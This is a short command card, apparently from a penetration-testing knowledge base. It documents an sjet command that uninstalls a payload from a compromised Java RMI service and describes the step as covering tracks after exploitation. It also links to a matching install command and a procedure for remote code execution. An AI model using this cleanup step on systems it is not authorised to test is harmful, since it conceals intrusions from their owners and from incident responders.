---
id: 5c5c2fa2-5df4-4586-b50c-8e4e267050dd
name: sjet-uninstall-payload-from-target
type: command
executor: bash
data: jython sjet.py $_TARGET_IP $_TARGET_PORT super_secret uninstall
output: null
created_at: '2023-04-06T03:56:00.890746+00:00'
updated_at: '2023-04-06T03:56:00.909054+00:00'
platforms:
  - Linux
tags:
  - exploitation
  - rmi
  - cleanup
verified: true
validated: true
---

# sjet-uninstall-payload-from-target

## Command

```bash
jython sjet.py $_TARGET_IP $_TARGET_PORT super_secret uninstall
```

## Description

Uninstalls the sjet payload from the target to remove persistence and cover tracks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP | Yes |
| $_TARGET_PORT | RMI port | Yes |
| super_secret | Payload name | Yes |
| uninstall | Action to remove payload | Yes |

## Examples

### Basic Usage

```bash
jython sjet.py 192.168.1.100 1099 super_secret uninstall
```

## Expected Output

"Payload uninstalled successfully."

## Related

- [[procedures/Exploit-Java-RMI-for-RCE-Using-Sjet-or-Mjet]]
- [[commands/sjet-install-payload-on-target]]
